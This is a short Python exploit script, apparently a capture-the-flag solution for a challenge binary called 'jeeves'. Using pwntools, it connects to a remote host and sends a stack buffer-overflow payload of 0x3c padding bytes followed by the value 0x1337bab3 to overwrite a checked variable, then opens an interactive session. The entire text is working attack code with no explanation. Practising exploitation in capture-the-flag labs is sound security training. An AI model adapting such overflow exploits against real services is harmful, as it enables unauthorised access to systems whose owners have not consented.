#!/usr/bin/python3

'''
    @Author: Lorenzo Invidia
    @Requirements: pwntools
'''

from pwn import *
context(os='linux', arch='amd64')
#context.log_level = 'debug'

host = '143.110.174.100'
#host = '127.0.0.1'
#port = 8080
port = 32391

e = ELF('./jeeves', checksec=False)
#p = process(e.path)
p = remote(host, port)

def exploit(payload):
    p.sendline(payload)
    p.interactive()

def write_to_file(payload):
    f = open("out.txt", "wb")
    f.write(payload)
    f.close()

key = 0x1337bab3

payload = b'A'*0x3c
payload += p32(key)

exploit(payload)
